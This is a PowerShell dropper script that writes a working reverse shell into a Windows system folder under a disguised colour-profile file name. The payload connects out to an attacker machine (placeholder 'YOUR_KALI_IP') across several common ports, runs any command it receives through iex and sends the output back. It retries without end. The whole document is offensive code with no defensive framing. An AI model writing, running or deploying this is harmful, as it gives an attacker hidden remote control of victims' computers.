# drops the reverse shell .ps1 into a disguised windows system path
$dir = "C:\Windows\System32\spool\drivers\color"

# full reverse shell payload written as a here-string so special chars are preserved
$payload = @'
$ports = @(80, 443, 8080, 3306, 4444, 5985, 8443)
$ip = "YOUR_KALI_IP"

while ($true) {
    foreach ($port in $ports) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
            $stream = $client.GetStream()
            [byte[]]$buf = New-Object byte[] 8192

            while ($true) {
                $i = $stream.Read($buf, 0, $buf.Length)
                if ($i -eq 0) { break }

                $command = [System.Text.Encoding]::UTF8.GetString($buf, 0, $i).Trim()
                $output = (iex $command 2>&1 | Out-String)
                $prompt = "PS " + (Get-Location).Path + "> "
                $response = [System.Text.Encoding]::UTF8.GetBytes($output + $prompt)
                $stream.Write($response, 0, $response.Length)
                $stream.Flush()
            }
            $client.Close()
        } catch {
            Start-Sleep -Seconds 5
        }
    }
    Start-Sleep -Seconds 15
}
'@

# write payload to disk at disguised path
$payload | Out-File -FilePath "$dir\ColorProfile_svc.ps1" -Encoding ASCII
Write-Host "[+] Payload written. Verifying..."

# print file contents to confirm it wrote correctly before trusting it
Get-Content "$dir\ColorProfile_svc.ps1"